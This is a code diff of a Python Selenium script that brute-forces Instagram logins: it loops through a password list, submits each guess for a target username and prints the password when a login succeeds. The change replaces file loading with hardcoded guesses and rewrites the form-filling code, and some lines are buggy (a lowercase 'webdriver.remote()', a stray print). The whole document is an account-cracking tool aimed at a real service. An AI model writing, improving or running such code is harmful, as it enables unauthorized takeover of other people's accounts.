@@ -1,6 +1,4 @@
 import requests
-import json
-import pdb
 from selenium import webdriver
 
 Done = False
@@ -27,27 +25,24 @@ def main():
                 break
             except FileNotFoundError:
                 print("password list doesn\'t exist, try again...")
-    with open(passlist_path, "r") as f:
-         passwords = f.read().split("\n")
+#    with open(passlist_path, "r") as f:
+#         passwords = f.read().split("\n")
+    passwords = ["djsjjanuue", "kanevuz82762", "258153@#$pdrm", "kekmevjsjh", "kekmevjsjh"]
     for password in passwords:
-        driver = webdriver.PhantomJS()
+        driver = webdriver.remote()
         driver.get('https://www.instagram.com/accounts/login/')
-        dom = driver.find_element_by_xpath('//*')
-        pdb.set_trace()
-        _username = dom.find_element_by_name(username)
-        _password = dom.find_element_by_name(password)
-        login_button = dom.find_element_by_xpath('//*[@class="_qv64e _gexxb _4tgw8 _njrw0"]')
-        _username.clear()
-        _password.clear()
-        _username.send_keys(username)
-        _password.send_keys(password)
-
+        username_field = driver.find_element_by_name("username")
+        password_field = driver.find_element_by_name("password")
+        login_button = driver.find_element_by_name("submit")
+        username_field.clear()
+        password_field.clear()
+        username_field.send_keys(username)
+        password_field.send_keys(password)
         login_button.click()
-        driver.get('https://www.instagram.com/accounts/login')
         if 'logged-in' in driver.page_source:
             Done = True
             break
-
+print("sh")
 main()
 if Done:
     print("Password found : %s" % password)
